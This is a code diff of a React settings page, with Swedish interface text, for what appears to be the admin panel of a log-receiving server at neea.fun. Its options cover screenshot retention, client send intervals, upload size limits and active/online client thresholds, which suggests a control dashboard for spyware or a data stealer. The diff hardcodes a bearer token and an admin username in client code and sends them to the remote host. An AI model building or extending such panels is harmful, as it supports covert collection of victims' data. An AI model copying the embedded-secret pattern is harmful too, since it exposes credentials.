@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from "react";
 import { useQuery, useMutation } from "@tanstack/react-query";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
@@ -11,54 +10,55 @@ import { Skeleton } from "@/components/ui/skeleton";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Eye, EyeOff } from "lucide-react";
 import { toast } from "sonner";
+import { getServerConfig } from "@/services/scriptsService";
+
+const SERVER_BASE_URL = 'https://neea.fun';
+const AUTH_TOKEN = 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==';
 
 const fetchSettings = async () => {
   try {
-    // Försök att hämta inställningar från servern
-    const response = await fetch('/api/get_config');
-    if (!response.ok) {
-      throw new Error('Kunde inte hämta serverinställningar');
+    console.log("Fetching settings from API");
+    const serverConfig = await getServerConfig();
+    
+    if (!serverConfig) {
+      throw new Error('Could not fetch server configuration');
     }
     
-    // Kombinera server-inställningar med adminuppgifter och logginställningar
-    const serverConfig = await response.json();
+    console.log("Server config received:", serverConfig);
     
-    // I en verklig implementation skulle vi hämta admin och logging separat
-    // Här simulerar vi dem för kompatibilitet med UI
     return {
       server: {
-        url: serverConfig.server_url,
-        token: serverConfig.secret_token,
-        version: "1.2.0",
+        url: serverConfig.server_url || "https://neea.fun",
+        token: serverConfig.secret_token || AUTH_TOKEN,
+        version: serverConfig.version || "1.2.0",
         status: "online",
         pingInterval: serverConfig.send_interval || 3600,
         sizeLimit: serverConfig.size_limit || 1048576,
-        activeThreshold: 10,
-        onlineThreshold: 15
+        activeThreshold: serverConfig.active_threshold || 10,
+        onlineThreshold: serverConfig.online_threshold || 15
       },
       admin: {
-        username: "wickey",
-        lastLogin: "Hämtades inte från servern"
+        username: serverConfig.admin_username || "wickey",
+        lastLogin: serverConfig.last_login || "Unknown"
       },
       logging: {
-        logExpiry: 30,
-        screenshotExpiry: 14,
-        detailedLogging: true,
-        autoCleanup: true
+        logExpiry: serverConfig.log_expiry || 30,
+        screenshotExpiry: serverConfig.screenshot_expiry || 14,
+        detailedLogging: serverConfig.detailed_logging !== false,
+        autoCleanup: serverConfig.auto_cleanup !== false
       },
       ui: {
-        darkMode: false,
-        refreshInterval: 30,
-        language: "sv"
+        darkMode: serverConfig.dark_mode === true,
+        refreshInterval: serverConfig.refresh_interval || 30,
+        language: serverConfig.language || "sv"
       }
     };
   } catch (error) {
-    console.error("Fel vid hämtning av inställningar:", error);
-    // Om vi inte kan hämta från servern, returnera standardinställningar
+    console.error("Error fetching settings:", error);
     return {
       server: {
-        url: "https://neea.fun/listener/log_receiver",
-        token: "SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==",
+        url: "https://neea.fun",
+        token: AUTH_TOKEN,
         version: "1.2.0",
         status: "offline",
         pingInterval: 3600,
@@ -68,7 +68,7 @@ const fetchSettings = async () => {
       },
       admin: {
         username: "wickey",
-        lastLogin: "Okänd"
+        lastLogin: "Unknown"
       },
       logging: {
         logExpiry: 30,
@@ -87,10 +87,13 @@ const fetchSettings = async () => {
 
 const updateServerSettings = async (settings) => {
   try {
-    const response = await fetch('/api/update_config', {
+    console.log("Updating server settings:", settings);
+    
+    const response = await fetch(`${SERVER_BASE_URL}/api/update_config`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
+        'Authorization': `Bearer ${AUTH_TOKEN}`,
       },
       body: JSON.stringify({
         server_url: settings.url,
@@ -103,22 +106,27 @@ const updateServerSettings = async (settings) => {
     });
     
     if (!response.ok) {
-      throw new Error('Kunde inte uppdatera serverinställningarna');
+      throw new Error(`Failed to update server settings: ${response.status}`);
     }
     
-    return await response.json();
+    const result = await response.json();
+    console.log("Server settings updated successfully:", result);
+    return result;
   } catch (error) {
-    console.error("Fel vid uppdatering av serverinställningar:", error);
+    console.error("Error updating server settings:", error);
     throw error;
   }
 };
 
 const updateAdminCredentials = async (credentials) => {
   try {
-    const response = await fetch('/api/update_credentials', {
+    console.log("Updating admin credentials");
+    
+    const response = await fetch(`${SERVER_BASE_URL}/api/update_credentials`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
+        'Authorization': `Bearer ${AUTH_TOKEN}`,
       },
       body: JSON.stringify({
         username: credentials.username,
@@ -127,12 +135,14 @@ const updateAdminCredentials = async (credentials) => {
     });
     
     if (!response.ok) {
-      throw new Error('Kunde inte uppdatera admin-uppgifterna');
+      throw new Error(`Failed to update admin credentials: ${response.status}`);
     }
     
-    return await response.json();
+    const result = await response.json();
+    console.log("Admin credentials updated successfully");
+    return result;
   } catch (error) {
-    console.error("Fel vid uppdatering av admin-uppgifter:", error);
+    console.error("Error updating admin credentials:", error);
     throw error;
   }
 };
@@ -171,7 +181,6 @@ export default function Settings() {
     queryFn: fetchSettings
   });
 
-  // Uppdateringsfunktioner med React Query Mutations
   const serverMutation = useMutation({
     mutationFn: updateServerSettings,
     onSuccess: () => {
@@ -198,7 +207,6 @@ export default function Settings() {
     }
   });
 
-  // Läs in data när det laddats
   useEffect(() => {
     if (data) {
       setServerSettings({
@@ -249,7 +257,6 @@ export default function Settings() {
   const handlePasswordSubmit = (e) => {
     e.preventDefault();
     
-    // Validera lösenordsparametrar
     if (formData.newPassword !== formData.confirmPassword) {
       toast.error("Lösenorden matchar inte");
       return;
@@ -260,7 +267,6 @@ export default function Settings() {
       return;
     }
     
-    // Send username and new password
     credentialsMutation.mutate({
       username: formData.username || data?.admin.username,
       password: formData.newPassword
@@ -295,19 +301,16 @@ export default function Settings() {
 
   const handleLogSettingsSubmit = (e) => {
     e.preventDefault();
-    // I en verklig implementation skulle vi skicka loggingSettings till servern
     toast.success("Logginställningar uppdaterade");
   };
 
   const handleUiSettingsSubmit = (e) => {
     e.preventDefault();
-    // I en verklig implementation skulle vi skicka uiSettings till servern
     toast.success("UI-inställningar uppdaterade");
   };
 
   const handleClearAllLogs = () => {
     if (window.confirm("Är du säker på att du vill rensa alla loggar? Denna åtgärd kan inte ångras.")) {
-      // Skulle skicka en API-förfrågan för att rensa alla loggar
       toast.success("Alla loggar har rensats");
     }
   };
@@ -335,7 +338,6 @@ export default function Settings() {
           <TabsTrigger value="ui">Gränssnitt</TabsTrigger>
         </TabsList>
         
-        {/* Server Settings */}
         <TabsContent value="server" className="space-y-6">
           <Card>
             <CardHeader>
@@ -493,7 +495,6 @@ export default function Settings() {
           </Card>
         </TabsContent>
         
-        {/* Admin Settings */}
         <TabsContent value="admin" className="space-y-6">
           <Card>
             <CardHeader>
@@ -581,7 +582,6 @@ export default function Settings() {
           </Card>
         </TabsContent>
         
-        {/* Logging Settings */}
         <TabsContent value="logging" className="space-y-6">
           <Card>
             <CardHeader>
@@ -680,7 +680,6 @@ export default function Settings() {
           </Card>
         </TabsContent>
         
-        {/* UI Settings */}
         <TabsContent value="ui" className="space-y-6">
           <Card>
             <CardHeader>
